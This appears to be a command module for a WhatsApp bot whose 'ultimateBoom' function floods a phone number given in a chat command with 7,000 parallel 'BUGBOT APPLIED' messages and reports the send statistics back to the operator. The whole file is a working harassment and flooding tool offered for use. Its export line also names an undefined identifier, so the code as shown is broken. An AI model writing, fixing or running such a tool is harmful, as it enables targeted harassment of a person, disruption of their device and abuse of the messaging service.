const { channelInfo } = require('../lib/messageConfig');

async function ultimateBoom(sock, chatId, message) {

try {

const text =
message.message?.conversation ||
message.message?.extendedTextMessage?.text ||
"";

const args = text.split(" ");

if (!args[1]) {
return sock.sendMessage(chatId, {
text: "❌ Usage: .sulexh 2547XXXXXXX"
}, { quoted: message });
}

const target = args[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

const TOTAL = 7000;

console.log("🚀 ULTIMATE BOOM START");

/* =============================
   SOCKET HEALTH CHECK
============================= */

if (!sock?.ws?.socket) {
return sock.sendMessage(chatId, {
text: "❌ Socket not ready"
}, { quoted: message });
}

const startTime = Date.now();

/* =============================
   Parallel Burst Queue
============================= */

const tasks = [];

for (let i = 0; i < TOTAL; i++) {

tasks.push((async () => {

try {

if (!sock?.ws?.socket) return false;

await sock.sendMessage(target, {
text: "💥 BUGBOT APPLIED"
});

return true;

} catch {
return false;
}

})());

}

/* Execute burst */
const results = await Promise.allSettled(tasks);

/* Statistics */

const success =
results.filter(r =>
r.status === "fulfilled" && r.value === true
).length;

const failed = TOTAL - success;

const endTime = Date.now();

/* Inbox confirmation only */

await sock.sendMessage(chatId, {

text:
`✅ ULTIMATE BOOM DONE\n\n` +
`🎯 Target: ${args[1]}\n` +
`📨 Sent: ${success}/${TOTAL}\n` +
`❌ Failed: ${failed}\n` +
`⚡ Engine: Adaptive Parallel\n` +
`⏱ Time: ${endTime - startTime} ms`,

...channelInfo

}, { quoted: message });

console.log("🔥 ULTIMATE BOOM COMPLETE");

} catch (err) {

console.log("Boom Elite Error:", err.message);

await sock.sendMessage(chatId, {
text: "❌ BOOM ENGINE FAILURE"
}, { quoted: message }).catch(()=>{});

}

}

module.exports = sulexhCommands;
